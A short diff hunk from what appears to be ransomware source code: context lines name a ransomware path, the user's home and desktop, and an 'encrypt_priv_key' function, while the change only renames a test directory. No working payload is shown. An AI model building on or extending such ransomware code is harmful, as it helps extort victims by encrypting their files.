@@ -35,7 +35,7 @@ home = enviroment.get_home_path()
 desktop = enviroment.get_desktop_path()
 username = enviroment.get_username()
 ransomware_path = os.path.join(home, ransomware_name)
-test_path = "/home/tarcisio/tests/"
+test_path = "/home/tarcisio/teste/"
 
 def encrypt_priv_key(msg, key):
     line = msg
